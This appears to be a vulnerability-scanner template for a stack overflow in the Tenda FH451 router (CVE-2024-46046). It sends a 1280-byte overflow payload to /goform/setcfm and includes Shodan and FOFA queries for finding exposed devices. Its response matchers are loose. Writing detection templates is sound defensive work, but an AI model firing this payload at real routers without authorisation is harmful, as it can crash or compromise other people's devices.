id: tenda-fh451-stack-overflow
info:
  name: Tenda FH451 v1.0.0.9 Stack Overflow Vulnerability
  author: Your Name
  severity: high
  description: |
    This template detects a stack overflow vulnerability in Tenda FH451 v1.0.0.9. The vulnerability exists in the RouteStatic function, allowing attackers to send overly long input data causing a buffer overflow, which could lead to remote code execution (RCE).
  references:
    - https://www.cvedetails.com/cve/CVE-2024-46046/
    - shodan-query: 'http.title:"Tenda" "FH451"'
    - fofa-query: 'title="Tenda FH451"'
  tags: tenda, overflow, rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/goform/setcfm"
    body: |
      funcname=save_list_data&funcpara1={{overflow_payload}}&funcpara2=aaaaaa
    headers:
      Content-Type: application/x-www-form-urlencoded

    payloads:
      overflow_payload:
        - "{{ 'a' * 1280 }}" # Adjusted overflow payload size (0x500 = 1280 bytes)

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "error"
          - "successful"
